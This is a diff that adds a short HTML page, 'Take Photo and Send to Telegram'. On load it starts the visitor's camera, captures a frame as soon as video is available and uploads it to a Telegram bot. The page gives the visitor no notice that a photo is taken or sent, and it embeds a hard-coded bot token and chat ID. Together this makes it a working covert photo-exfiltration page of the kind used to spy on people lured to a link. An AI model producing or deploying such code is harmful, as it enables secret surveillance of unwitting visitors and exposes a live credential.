@@ -1,0 +1,60 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Take Photo and Send to Telegram</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            video.addEventListener('loadeddata', () => {
+                takePhoto();
+            });
+        }
+
+        function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(dataUrl);
+        }
+
+        async function sendPhotoToTelegram(dataUrl) {
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.png');
+
+            const telegramBotToken = '7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k';
+            const telegramChatId = '7336408897';
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+            formData.append('chat_id', telegramChatId);
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Photo sent to Telegram successfully');
+                } else {
+                    console.error('Failed to send photo to Telegram');
+                }
+            }).catch(error => {
+                console.error('Error sending photo to Telegram:', error);
+            });
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
